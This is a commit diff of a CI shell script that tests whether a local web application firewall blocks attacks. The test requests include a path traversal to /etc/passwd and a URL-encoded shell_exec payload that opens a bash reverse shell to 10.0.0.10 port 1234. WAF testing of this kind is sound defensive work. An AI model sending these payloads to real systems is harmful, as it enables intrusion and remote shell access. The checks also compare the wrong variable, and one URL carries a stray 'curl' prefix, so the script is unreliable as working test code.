7d134f56a1eee929f8277214603349c31ef130b4
justin-p <justin-p@users.noreply.github.com>
2019-04-25 12:48:21 +0200

    testing

--- tests/travis.test.sh
+++ tests/travis.test.sh
@@ -1,4 +1,34 @@
 #/bin/bash
-sleep 30s
-http_code=$(curl "http://localhost:81/somefile.php?someparam=../../../etc" -s -f -w %{http_code} -o /dev/null)
-if (($http_code == 403)); then echo "We got a $http_code. Our WAF blocked the reqeust, Noice!"; exit 0 ;else echo "We got a $http_code. Our WAF did NOT block the request :("; exit 200; fi
+echo "[+] - Checking if our WAF is up."
+for I in 1 2 3 4 5
+do
+	http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=HelloWorld" -s -f -w %{http_code} -o /dev/null)
+	if (($http_code == 200)); then 
+		echo "[+] - We got a $http_code. Our WAF is up!"; 
+		break
+  	fi
+	echo "[!] - We got a $http_code. Our WAF seems to be down. Check $I out of 5"; 
+	sleep 10s
+	if (($I == 5)); then
+		echo "[!] - Check counter $I out of 5. Killing test."; 		
+		exit 200; 
+	fi	
+done
+
+echo "[+] - Checking Path Traversal"
+path_traversal_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=../../../etc/passwd" -s -f -w %{http_code} -o /dev/null)
+if (($http_code == 403)); then 
+	echo "[+] - We got a $path_traversal_http_code on Path Traversal. Our WAF blocked the reqeust, Noice!"; 
+else 
+	echo "[!] - We got a $path_traversal_http_code on Path Traversal. Our WAF did NOT block the request :("; 
+	exit 201; 
+fi
+
+echo "[+] - Checking Shell Exec"
+shell_exec_http_code=$(curl "curl http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -o /dev/null)
+if (($http_code == 403)); then 
+	echo "We got a $shell_exec_http_code on Shell Exec. Our WAF blocked the reqeust, Noice!"; 
+else 
+	echo "We got a $shell_exec_http_code on Shell Exec. Our WAF did NOT block the request :("; 
+	exit 202; 
+fi
